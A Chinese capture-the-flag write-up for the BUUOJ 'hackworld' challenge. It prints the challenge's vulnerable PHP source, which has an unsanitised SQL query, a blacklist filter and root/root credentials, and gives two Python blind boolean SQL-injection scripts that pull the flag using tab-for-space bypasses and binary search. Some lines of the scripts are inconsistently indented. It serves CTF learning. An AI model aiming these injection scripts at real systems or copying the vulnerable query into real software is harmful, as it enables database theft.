>比赛结束以后采用非官方复现平台做的题，因为和比赛题有轻微不同，比赛中存放flag的table是ctf，这里是flag。

#### 题目地址
buuoj.cn

#### 解题过程

题目中只有一个页面，需要提交id。
![初始界面](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/hackworld.PNG)

id为1,2时，可以分别得到一句话。id为0时，显示error，可能是因为结果为空集。
```txt
id=1
Hello, glzjin wants a girlfriend.
id=2
Do you want to be my girlfriend?
```


id提交为单引号返回false，填入空格会直接显示SQL Injection Checked。这说明id除有过滤，空格被过滤了，但是单引号没过滤。

尝试用Tab代替空格，发现可以。

接下来根据题目中的提示构造payload：
```txt
1   union    select  flag    from    flag
```
被过滤了，直接输入一个
```txt
1   union
```
也会被过滤

这说明union也被过滤了。最后测试发现select和from，括号没有被过滤可以考虑使用函数。

有幸找到了这题的源码，在这里放一下，看看究竟过滤了啥。
```php
<?php
$dbuser='root';
$dbpass='root';

function safe($sql){
    #被过滤的内容 函数基本没过滤
    $blackList = array(' ','||','#','-',';','&','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./');
    foreach($blackList as $blackitem){
        if(stripos($sql,$blackitem)){
            return False;
        }
    }
    return True;
}
if(isset($_POST['id'])){
    $id = $_POST['id'];
}else{
    die();
}
$db = mysql_connect("localhost",$dbuser,$dbpass);
if(!$db){
    die(mysql_error());
}   
mysql_select_db("ctf",$db);

if(safe($id)){
    $query = mysql_query("SELECT content from passage WHERE id = ${id} limit 0,1");
    
    if($query){
        $result = mysql_fetch_array($query);
        
        if($result){
            echo $result['content'];
        }else{
            echo "Error Occured When Fetch Result.";
        }
    }else{
    	var_dump($query);
    }
}else{
    die("SQL Injection Checked.");
}

```

接下来就想办法借助函数构造注入就可以了。思路有很多，看过北邮大佬写的延时注入，这里说一下我的思路。

借助substr函数截取flag中的内容，长度依次增加。

用if函数判断截取出来的内容是什么，这里需要穷举。如果判断成功，返回1，否则返回2。

#### exp

```python
import requests
import time
url = "http://web43.node1.buuoj.cn/index.php"
data = {"id":""}
flag = 'flag{'
length = 5
while True:
    #直接从数字开始猜
	for i in range(48,127):
        #复现平台有waf，一秒只能访问一次
		time.sleep(1)
		#绕过一些过滤字符
		if i in [38,42,43,45,59,96]:
			continue
		data["id"] = "if(substr((select		flag		from	flag),1,{})='{}',1,2)".format(length+1,flag+chr(i)) 
		r = requests.post(url,data=data)
		#返回1
        if 'Hello' in r.text:
			flag+=chr(i)
			length+=1
			print(flag)
			break
	if flag[-1]=='}':
		break

```
这个脚本有点慢，毕竟一个个的猜。如果想快一点，猜的时候可以考虑每次猜一个字符，使用二分法。

下面这段代码稍微改了一下判断的规则，判断ascii码。这样做的好处是如果遇到过滤字符也能得到结果，如果按照最初始的版本，假设flag中包含-，那就gg了。
```python
import requests
import time
#url是随时更新的，具体的以做题时候的为准
url = 'http://40c9be7a-36f0-4e80-94ca-d1ac9e121947.node1.buuoj.cn/index.php'
data = {"id":""}
flag = 'flag{'

i = 6
while True:
#从可打印字符开始
	begin = 32
	end = 126
	tmp = (begin+end)//2
	while begin<end:
		print(begin,tmp,end)
		time.sleep(1)
		data["id"] = "if(ascii(substr((select		flag		from	flag),{},1))>{},1,2)".format(i,tmp)
		r = requests.post(url,data=data)
		if 'Hello' in r.text:
			begin = tmp+1
			tmp = (begin+end)//2 
		else:
			end = tmp
			tmp = (begin+end)//2

	flag+=chr(tmp)
    print(flag)
	i+=1
	if flag[-1]=='}':
		break

```
最后得到了flag。